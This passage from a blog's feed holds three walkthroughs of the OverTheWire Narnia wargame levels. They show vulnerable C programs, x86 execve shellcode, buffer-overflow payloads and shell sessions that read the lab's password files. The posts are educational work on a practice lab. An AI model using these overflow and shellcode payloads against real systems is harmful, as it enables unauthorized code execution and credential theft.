&lt;p&gt;Great, we can see that even with the shellcode B's overwrote the EIP. Now let's try it with the actuall address - somewhere in the middle of the A letters. Maybe &lt;b&gt;0xffffd863&lt;/b&gt;?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ ./narnia2 $(python -c &quot;print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x63\xd8\xff\xff'&quot;)
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we've got the password to the next level!&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The challenge was awesome, but really time consuming. It was worth every minute as I learned a lot from trying out these different ways to finish this level. Thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Narnia 1 -&amp;gt; 2</title><link href="http://localhost:4000/overthewire.org-narnia-2/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 1 -&gt; 2" /><published>2017-02-02T00:00:00+00:00</published><updated>2017-02-02T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-narnia-2</id><content type="html" xml:base="http://localhost:4000/overthewire.org-narnia-2/">&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!&lt;/p&gt;

&lt;h1&gt;Challenge&lt;/h1&gt;

&lt;p&gt;Firstly let's take a look at the code of the program. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;    
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Give me something to execute at the env-variable EGG&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying to execute EGG!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The first thing that I see is that this program will check, whether or not the value of EGG variable is empty, if yes, it will print the message. But if not, it will try to execute it. &lt;/p&gt;

&lt;p&gt;But what is enviromental variable? &lt;/p&gt;

&lt;p&gt;Every time shell session is started, process is gathering information that should be available to the shell process and all child processes, putting them in special area called &lt;b&gt;enviroment&lt;/b&gt;. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;Enviromental variables&lt;/b&gt; provide a way to influence the behaviour of software on the system. For example, the &quot;LANG&quot; environment variable determines the language in which software programs communicate with the user. They are represented as an key-value pairs. &lt;/p&gt;

&lt;pre&gt;
KEY=VALUE
KEY=VALUE1:VALUE2
KEY=&quot;VALUE WITH SPACES&quot;
&lt;/pre&gt;

&lt;p&gt;Now when we understand the topic, let's try to set EGG variable as some random text possibly causing the program to crash. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;narnia1@melinda:/narnia$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;completelyrandomtext&quot;&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;narnia1@melinda:/narnia$ &lt;/span&gt;./narnia1
Trying to execute EGG!
Segmentation fault&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Yes! Now let's try and find some x86 shellcode that will be executed by the program. What I found working, was this &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-811.php&quot;&gt;shellcode&lt;/a&gt;, which was actually second one I've tried - the first one didn't want to cooperate ;)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;narnia1@melinda:/narnia$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;69&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6e&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;e3&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;b0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;40&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;s1&quot;&gt;'
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have the password to the next level! &lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;It was another great challenge from &lt;a href=&quot;www.overthewire.org&quot;&gt;OverTheWire&lt;/a&gt;. I'm looking forward to the next one, maybe something a little bit harder? We'll see!&lt;/p&gt;

&lt;p&gt;&lt;b&gt;UPDATE&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;To gain better insight into who visits my website, I decided to add Piwik Analytics as a way to both give me essential information, and to repsect your privacy. You can read more at the &lt;a href=&quot;/privacy/&quot;&gt;Privacy Policy&lt;/a&gt;, but if you still have any questions, contact me and I'll try my best to answer. &lt;/p&gt;

&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!</summary></entry><entry><title type="html">Overthewire.org - Narnia 0 -&amp;gt; 1</title><link href="http://localhost:4000/overthewire.org-narnia-1/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 0 -&gt; 1" /><published>2017-01-01T00:00:00+00:00</published><updated>2017-01-01T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-narnia-1</id><content type="html" xml:base="http://localhost:4000/overthewire.org-narnia-1/">&lt;h1&gt;Introduction&lt;/h1&gt;

&lt;p&gt;As a part of my New Year's resolutions I decided to improve my knowledge of binary exploitation, learn more by completing challenges from &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;, especially Narnia, as they are aimed to people wanting to learn about basics. &lt;/p&gt;

&lt;h1&gt;Challenge&lt;/h1&gt;

&lt;p&gt;Firstly, let's take a look at the code of this program. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Here is your chance: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%24s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buf: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;val: 0x%08x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;WAY OFF!!!!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Okay, now we know that the binary accepts one string input from the user and puts the string into a buffer of 20 bytes, then if the value of variable &lt;b&gt;val&lt;/b&gt; is equal to &lt;b&gt;0xdeadbeef&lt;/b&gt;, we will get a shell. Let's try to send to 20 &quot;A&quot; characters, with 4 letters &quot;B&quot;, in order to overflow the buffer, and overwrite the value of &lt;b&gt;0x41414141&lt;/b&gt; with our &quot;B&quot; letters. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ python -c print'(&quot;A&quot; * 20) + &quot;BBBB&quot;' | ./narnia0
Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
narnia0@melinda:/narnia$&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, now we know that it works and we're one step closer to the solution. Now let's think how we can change value to &lt;b&gt;0xdeadbeef&lt;/b&gt;. First thing to remember - the values need to be in hex format, not characters as I thought at first. In addition, I recalled that the bytes will be in reversed order, so we have to write them from the last to the first one. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ python -c print'(&quot;A&quot; * 20) + &quot;\xef\xbe\xad\xde&quot;' | ./narnia0
Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We got the shell but it closed immediately! Let's find a way to keep it running, in order to view the password to the next level. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ (python -c print'(&quot;A&quot; * 20) + &quot;\xef\xbe\xad\xde&quot;'; cat /etc/narnia_pass/narnia1) | ./narnia0
Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
cat: /etc/narnia_pass/narnia1: Permission denied&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately, it closed too quickly and the command was executed after the shell had closed. I tried many other commands, and noticed something strange - &lt;b&gt;cat&lt;/b&gt; seemed to do exactly what we want! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ (python -c print'(&quot;A&quot; * 20) + &quot;\xef\xbe\xad\xde&quot;'; cat) | ./narnia0
Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
********&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But why is it working? From man page: &lt;/p&gt;

&lt;p&gt;&lt;b&gt;With no FILE, or when FILE is -, read standard input.&lt;/b&gt;&lt;/p&gt;

&lt;h1&gt;Last words&lt;/h1&gt;

&lt;p&gt;As I never tought before, this was a great challenge, and I think I got more interested in binary exploitation and reverse engineering. Can't wait to try out some other challenges, and I'll see you in the next one!&lt;/p&gt;

&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry></feed>